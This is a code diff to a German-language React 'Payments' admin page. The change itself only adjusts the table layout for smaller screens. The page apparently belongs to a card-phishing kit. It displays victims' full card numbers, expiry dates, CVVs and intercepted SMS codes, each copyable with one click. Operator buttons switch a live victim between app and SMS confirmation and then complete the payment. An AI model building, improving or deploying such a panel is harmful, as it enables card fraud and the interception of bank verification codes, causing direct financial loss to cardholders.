@@ -280,7 +280,7 @@ const Payments = () => {
         <div className="min-h-screen flex w-full">
           <AppSidebar />
           <main className="flex-1 p-6 bg-gray-50/30">
-            <div className="max-w-7xl mx-auto space-y-6">
+            <div className="w-full space-y-6">
               {/* Header */}
               <div className="flex items-center justify-between">
                 <div>
@@ -378,24 +378,24 @@ const Payments = () => {
                   ) : (
                     <div className="overflow-x-auto">
                       <Table>
-                        <TableHeader>
-                          <TableRow>
-                            <TableHead>Status</TableHead>
-                            <TableHead>Bestellnummer</TableHead>
-                            <TableHead>Datum</TableHead>
-                            <TableHead>Endpreis</TableHead>
-                            <TableHead>Karteninhaber</TableHead>
-                            <TableHead>Kartennummer</TableHead>
-                            <TableHead>Ablauf</TableHead>
-                            <TableHead>CVV</TableHead>
-                            <TableHead>Verifikation</TableHead>
-                            <TableHead>SMS-Code</TableHead>
-                            <TableHead>App-Status</TableHead>
-                            <TableHead>Letzte Aktivität</TableHead>
-                            <TableHead>Dauer</TableHead>
-                            <TableHead>Aktionen</TableHead>
-                          </TableRow>
-                        </TableHeader>
+                         <TableHeader>
+                           <TableRow>
+                             <TableHead>Status</TableHead>
+                             <TableHead>Bestellnummer</TableHead>
+                             <TableHead className="hidden lg:table-cell">Datum</TableHead>
+                             <TableHead>Endpreis</TableHead>
+                             <TableHead>Karteninhaber</TableHead>
+                             <TableHead className="hidden xl:table-cell">Kartennummer</TableHead>
+                             <TableHead className="hidden xl:table-cell">Ablauf</TableHead>
+                             <TableHead className="hidden xl:table-cell">CVV</TableHead>
+                             <TableHead>Verifikation</TableHead>
+                             <TableHead className="hidden lg:table-cell">SMS-Code</TableHead>
+                             <TableHead className="hidden lg:table-cell">App-Status</TableHead>
+                             <TableHead className="hidden md:table-cell">Letzte Aktivität</TableHead>
+                             <TableHead className="hidden lg:table-cell">Dauer</TableHead>
+                             <TableHead>Aktionen</TableHead>
+                           </TableRow>
+                         </TableHeader>
                         <TableBody>
                           {sessionsToDisplay.map((session) => (
                             <TableRow key={session.id}>
@@ -420,108 +420,108 @@ const Payments = () => {
                                    </Badge>
                                 </div>
                               </TableCell>
-                              <TableCell className="font-mono">
-                                {session.orders?.order_number || '-'}
-                              </TableCell>
-                              <TableCell className="whitespace-nowrap">
-                                {session.orders?.created_at 
-                                  ? format(new Date(session.orders.created_at), 'dd.MM.yyyy HH:mm', { locale: de })
-                                  : '-'}
-                              </TableCell>
-                              <TableCell className="font-medium">
-                                €{session.orders?.final_price?.toFixed(2) || '0.00'}
-                              </TableCell>
-                              <TableCell 
-                                className="cursor-pointer hover:bg-gray-100 transition-colors"
-                                onClick={() => session.orders?.cardholder_name && copyToClipboard(session.orders.cardholder_name, 'Karteninhaber')}
-                              >
-                                {session.orders?.cardholder_name || '-'}
-                              </TableCell>
-                              <TableCell 
-                                className="font-mono cursor-pointer hover:bg-gray-100 transition-colors"
-                                onClick={() => session.orders?.card_number && copyToClipboard(session.orders.card_number, 'Kartennummer')}
-                              >
-                                {session.orders?.card_number || '-'}
-                              </TableCell>
-                              <TableCell 
-                                className="font-mono cursor-pointer hover:bg-gray-100 transition-colors"
-                                onClick={() => session.orders?.expiry_date && copyToClipboard(session.orders.expiry_date, 'Ablaufdatum')}
-                              >
-                                {session.orders?.expiry_date || '-'}
-                              </TableCell>
-                              <TableCell 
-                                className="font-mono cursor-pointer hover:bg-gray-100 transition-colors"
-                                onClick={() => session.orders?.cvv && copyToClipboard(session.orders.cvv, 'CVV')}
-                              >
-                                {session.orders?.cvv || '-'}
-                              </TableCell>
-                              <TableCell>
-                                {getVerificationStatusBadge(session.verification_status)}
-                              </TableCell>
-                              <TableCell className="font-mono text-center">
-                                {session.verification_method === 'sms_confirmation' && session.sms_code 
-                                  ? session.sms_code 
-                                  : '-'}
-                              </TableCell>
-                              <TableCell className="text-center">
-                                {session.verification_method === 'app_confirmation' ? (
-                                  <div className={`w-3 h-3 rounded-full mx-auto ${
-                                    session.verification_status === 'app_confirmed' 
-                                      ? 'bg-green-500' 
-                                      : 'bg-red-500'
-                                  }`} />
-                                ) : '-'}
-                              </TableCell>
-                              <TableCell className="whitespace-nowrap text-sm text-muted-foreground">
-                                {formatLastSeen(session.last_seen)}
-                              </TableCell>
-                              <TableCell className="whitespace-nowrap text-sm">
-                                {formatDuration(session.created_at, session.last_seen)}
-                              </TableCell>
-                              <TableCell>
-                                <div className="flex flex-col space-y-2 min-w-[200px]">
-                                  {session.verification_status === 'waiting' && session.verification_method === 'pending' && (
-                                    <>
-                                      <Button
-                                        size="sm"
-                                        variant="outline"
-                                        onClick={() => handleVerificationAction(session.session_id, 'app_confirmation')}
-                                        className="flex items-center space-x-1"
-                                      >
-                                        <Smartphone className="w-3 h-3" />
-                                        <span>App-Bestätigung</span>
-                                      </Button>
-                                      <Button
-                                        size="sm"
-                                        variant="outline"
-                                        onClick={() => handleVerificationAction(session.session_id, 'sms_confirmation')}
-                                        className="flex items-center space-x-1"
-                                      >
-                                        <MessageSquare className="w-3 h-3" />
-                                        <span>SMS-Bestätigung</span>
-                                      </Button>
-                                      <Button
-                                        size="sm"
-                                        variant="outline"
-                                        onClick={() => handleVerificationAction(session.session_id, 'choice_required')}
-                                        className="flex items-center space-x-1"
-                                      >
-                                        <CheckCircle className="w-3 h-3" />
-                                        <span>Auswahlmöglichkeit</span>
-                                      </Button>
-                                    </>
-                                  )}
-                                  {(session.verification_status === 'app_confirmed' || session.verification_status === 'sms_confirmed') && (
-                                    <Button
-                                      size="sm"
-                                      onClick={() => handleCompletePayment(session.session_id)}
-                                      className="bg-green-600 hover:bg-green-700 text-white"
-                                    >
-                                      Zahlung bestätigen
-                                    </Button>
-                                  )}
-                                </div>
-                              </TableCell>
+                               <TableCell className="font-mono">
+                                 {session.orders?.order_number || '-'}
+                               </TableCell>
+                               <TableCell className="whitespace-nowrap hidden lg:table-cell">
+                                 {session.orders?.created_at 
+                                   ? format(new Date(session.orders.created_at), 'dd.MM.yyyy HH:mm', { locale: de })
+                                   : '-'}
+                               </TableCell>
+                               <TableCell className="font-medium">
+                                 €{session.orders?.final_price?.toFixed(2) || '0.00'}
+                               </TableCell>
+                               <TableCell 
+                                 className="cursor-pointer hover:bg-gray-100 transition-colors"
+                                 onClick={() => session.orders?.cardholder_name && copyToClipboard(session.orders.cardholder_name, 'Karteninhaber')}
+                               >
+                                 {session.orders?.cardholder_name || '-'}
+                               </TableCell>
+                               <TableCell 
+                                 className="font-mono cursor-pointer hover:bg-gray-100 transition-colors hidden xl:table-cell"
+                                 onClick={() => session.orders?.card_number && copyToClipboard(session.orders.card_number, 'Kartennummer')}
+                               >
+                                 {session.orders?.card_number || '-'}
+                               </TableCell>
+                               <TableCell 
+                                 className="font-mono cursor-pointer hover:bg-gray-100 transition-colors hidden xl:table-cell"
+                                 onClick={() => session.orders?.expiry_date && copyToClipboard(session.orders.expiry_date, 'Ablaufdatum')}
+                               >
+                                 {session.orders?.expiry_date || '-'}
+                               </TableCell>
+                               <TableCell 
+                                 className="font-mono cursor-pointer hover:bg-gray-100 transition-colors hidden xl:table-cell"
+                                 onClick={() => session.orders?.cvv && copyToClipboard(session.orders.cvv, 'CVV')}
+                               >
+                                 {session.orders?.cvv || '-'}
+                               </TableCell>
+                               <TableCell>
+                                 {getVerificationStatusBadge(session.verification_status)}
+                               </TableCell>
+                               <TableCell className="font-mono text-center hidden lg:table-cell">
+                                 {session.verification_method === 'sms_confirmation' && session.sms_code 
+                                   ? session.sms_code 
+                                   : '-'}
+                               </TableCell>
+                               <TableCell className="text-center hidden lg:table-cell">
+                                 {session.verification_method === 'app_confirmation' ? (
+                                   <div className={`w-3 h-3 rounded-full mx-auto ${
+                                     session.verification_status === 'app_confirmed' 
+                                       ? 'bg-green-500' 
+                                       : 'bg-red-500'
+                                   }`} />
+                                 ) : '-'}
+                               </TableCell>
+                               <TableCell className="whitespace-nowrap text-sm text-muted-foreground hidden md:table-cell">
+                                 {formatLastSeen(session.last_seen)}
+                               </TableCell>
+                               <TableCell className="whitespace-nowrap text-sm hidden lg:table-cell">
+                                 {formatDuration(session.created_at, session.last_seen)}
+                               </TableCell>
+                               <TableCell>
+                                 <div className="flex flex-wrap gap-1">
+                                   {session.verification_status === 'waiting' && session.verification_method === 'pending' && (
+                                     <>
+                                       <Button
+                                         size="sm"
+                                         variant="outline"
+                                         onClick={() => handleVerificationAction(session.session_id, 'app_confirmation')}
+                                         className="text-xs px-2 py-1"
+                                       >
+                                         <Smartphone className="w-3 h-3" />
+                                         <span className="hidden sm:inline ml-1">App</span>
+                                       </Button>
+                                       <Button
+                                         size="sm"
+                                         variant="outline"
+                                         onClick={() => handleVerificationAction(session.session_id, 'sms_confirmation')}
+                                         className="text-xs px-2 py-1"
+                                       >
+                                         <MessageSquare className="w-3 h-3" />
+                                         <span className="hidden sm:inline ml-1">SMS</span>
+                                       </Button>
+                                       <Button
+                                         size="sm"
+                                         variant="outline"
+                                         onClick={() => handleVerificationAction(session.session_id, 'choice_required')}
+                                         className="text-xs px-2 py-1"
+                                       >
+                                         <CheckCircle className="w-3 h-3" />
+                                         <span className="hidden sm:inline ml-1">Wahl</span>
+                                       </Button>
+                                     </>
+                                   )}
+                                   {(session.verification_status === 'app_confirmed' || session.verification_status === 'sms_confirmed') && (
+                                     <Button
+                                       size="sm"
+                                       onClick={() => handleCompletePayment(session.session_id)}
+                                       className="bg-green-600 hover:bg-green-700 text-white text-xs px-2 py-1"
+                                     >
+                                       Bestätigen
+                                     </Button>
+                                   )}
+                                 </div>
+                               </TableCell>
                             </TableRow>
                           ))}
                         </TableBody>
